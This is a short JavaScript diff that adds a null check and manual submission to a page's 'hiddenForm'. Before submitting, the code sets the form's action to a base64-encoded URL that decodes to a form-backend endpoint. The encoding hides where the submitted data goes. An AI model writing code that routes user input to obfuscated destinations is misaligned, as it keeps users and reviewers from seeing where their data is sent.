@@ -44,8 +44,19 @@ document.querySelector('a[href="#news"]').addEventListener("click", function(e) 
 document.addEventListener("DOMContentLoaded", function () {
     let form = document.getElementById("hiddenForm");
 
-    // Set action dynamically before submitting
-    form.addEventListener("submit", function (event) {
-        form.action = atob("aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vSHRjaWx3QkRE");
-    });
+    // Check if the form exists
+    if (form) {
+        form.addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Set action dynamically before submitting
+            form.action = atob("aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vSHRjaWx3QkRE");
+
+            // Now submit the form
+            form.submit();
+        });
+    } else {
+        console.error("Form not found!");
+    }
 });
+
